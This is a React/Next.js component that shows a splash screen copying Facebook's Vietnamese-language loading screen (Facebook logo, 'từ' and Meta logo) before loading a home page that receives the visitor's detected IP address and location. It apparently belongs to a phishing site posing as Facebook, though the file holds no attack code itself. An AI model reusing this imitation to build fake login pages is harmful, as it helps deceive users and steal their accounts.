"use client";

import { useEffect, useState } from "react";
import Image from "next/image";
import HomePageClient from "./home-page-client";
import { Locale } from "@/lib/i18n";

type HomePageLoaderProps = {
  locale: Locale;
  detectedCountryCode?: string | null;
  detectedCallingCode?: string | null;
  detectedIp?: string | null;
  detectedLocation?: string | null;
};

export default function HomePageLoader ( props: HomePageLoaderProps )
{
  const [ ready, setReady ] = useState( false );

  useEffect( () =>
  {
    const timer = setTimeout( () => setReady( true ), 1000 );
    return () => clearTimeout( timer );
  }, [] );

  if ( !ready )
  {
    return (
      <div
        style={ {
          minHeight: "100vh",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          background: "#ffffff",
          position: "relative",
        } }
      >
        <div
          style={ {
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: "12px",
          } }
        >
          <Image src="/facebook.png" alt="Facebook" width={ 64 } height={ 64 } priority />

        </div>
        <div
          style={ {
            color: "#000000",
            position: "absolute",
            bottom: "40px",
            left: "50%",
            transform: "translateX(-50%)",
            alignItems: "center"
          } }
        > <div
          style={ {
            marginLeft: '20px',
            fontSize: "16px",
            fontFamily: "Helvetica, Arial, sans-serif",
            fontWeight: "400",
          } }
        >
            từ
          </div>
          <Image src="/metalogo.svg" alt="Meta" width={ 60 } height={ 12 } priority />
        </div>
      </div>
    );
  }

  return <HomePageClient { ...props } />;
}
